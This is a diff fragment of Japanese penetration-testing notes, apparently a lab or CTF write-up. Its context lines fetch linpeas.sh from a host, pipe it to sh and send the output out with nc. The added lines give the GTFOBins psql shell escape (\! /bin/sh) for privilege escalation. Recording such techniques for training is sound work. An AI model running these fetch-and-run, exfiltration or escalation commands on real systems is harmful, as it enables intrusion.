@@ -38,7 +38,16 @@ nc -lvnp 9002 | tee linpeas.out
 curl 192.168.45.201:8888/linpeas.sh | sh | nc -q 0 192.168.45.201 9002
 ```
 
-psqlがNO PASSWORDで実行できるため、
+psqlがNO PASSWORDで実行できるため、gtfobinsを参照に県g年昇格
+```sh
+# GTFOBinx
+psql
+\! /bin/sh
+```
+```sh
+# 実際に実行したコマンド
+
+```
 
 
 ### 実行結果抽出
